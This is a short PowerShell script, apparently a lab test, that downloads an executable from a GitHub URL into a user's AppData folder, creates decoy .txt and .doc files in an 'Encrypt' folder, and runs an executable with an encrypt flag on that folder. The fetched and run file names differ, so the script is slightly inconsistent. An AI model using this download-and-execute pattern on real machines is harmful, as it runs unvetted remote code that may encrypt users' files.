$localpath = 'C:\Users\VD` Winx64\AppData\Local'
$WebClient = New-Object System.Net.WebClient

$WebClient.DownloadFile("https://github.com/ashakiro/test1/raw/main/main.exe","$localpath\main.exe")


New-Item -Path "C:\Users\VD Winx64\AppData\Local\Encrypt\PStxt.txt"
New-Item -Path "C:\Users\VD Winx64\AppData\Local\Encrypt\PSdoc.doc"

powershell "$localpath\main1.exe" -p $localpath\Encrypt -e
